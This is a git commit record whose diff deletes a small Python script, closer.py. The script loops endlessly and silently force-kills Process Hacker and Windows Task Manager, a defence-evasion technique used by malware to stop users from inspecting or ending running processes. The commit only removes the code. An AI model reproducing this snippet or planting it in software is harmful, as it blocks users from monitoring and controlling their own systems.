d172685a713fab3fafe5d149e025a0837d5d4483
semihcelik8 <81470723+semihcelik8@users.noreply.github.com>
2022-05-15 18:41:51 +0300

    Delete closer.py

--- closer.py
+++
@@ -1,6 +0,0 @@
-import subprocess
-
-while True:
-        CREATE_NO_WINDOW = 0x08000000
-        subprocess.call('taskkill /F /IM processhacker.exe', creationflags=CREATE_NO_WINDOW)
-        subprocess.call('taskkill /F /IM taskmgr.exe', creationflags=CREATE_NO_WINDOW)
